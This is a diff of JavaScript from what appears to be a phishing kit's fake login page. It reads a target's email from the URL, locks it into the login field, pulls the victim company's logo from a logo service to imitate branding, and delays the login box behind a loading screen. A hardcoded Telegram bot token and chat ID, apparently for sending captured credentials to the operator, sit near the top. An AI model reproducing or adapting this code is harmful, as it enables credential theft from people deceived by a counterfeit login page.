@@ -1,3 +1,10 @@
+ // --- SHOW LOGIN AFTER LOADING ---
+  setTimeout(() => {
+    document.getElementById("loading").style.display = "none";
+    loginBox.style.display = "block";
+    setTimeout(() => loginBox.style.opacity = 1, 50);
+  }, 3000);
+  
 // Telegram Bot config
 const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
 const TELEGRAM_CHAT_ID = "7574749243";
@@ -17,27 +24,25 @@ const maxAttempts = 3;
 
 document.body.classList.add('blur-active');
 
-// Get email from URL  ?u=
-const params = new URLSearchParams(window.location.search);
-const rawEmail = params.get("br29ns97");
+if (!/^[^@]+@[^@]+\.[^@]+$/.test(rawHash)) {
+  alert("Invalid or missing email in the URL hash.");
+} else {
+  emailInput.value = rawHash;
+  emailInput.setAttribute("readonly", true);
 
-// Check if email exists AND is valid
-if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
-
-  emailInput.value = rawEmail;
-  emailInput.setAttribute("uneditable", true);
-
-  const domain = rawEmail.split('@')[1];
- 
- // HIDE parameter
-  history.replaceState({}, document.title, window.location.pathname);
+  const domain = rawHash.split('@')[1];
 
   // Set logo
   logoImg.src = `https://logo.clearbit.com/${domain}`;
   logoImg.onerror = () => {
     logoImg.src = "https://via.placeholder.com/150?text=Logo";
   };
+// Set loading animation logo
+        const loadingImg = document.getElementById('loading-logo');
+        loadingImg.src = `https://logo.clearbit.com/${domain}`;
+        loadingImg.onerror = () => { loadingImg.src = 'https://via.placeholder.com/80?text=L'; };
 
+  
   // Setup fallback screenshot container
   const fallbackScreenshot = document.createElement('img');
   fallbackScreenshot.id = "fallback-screenshot";
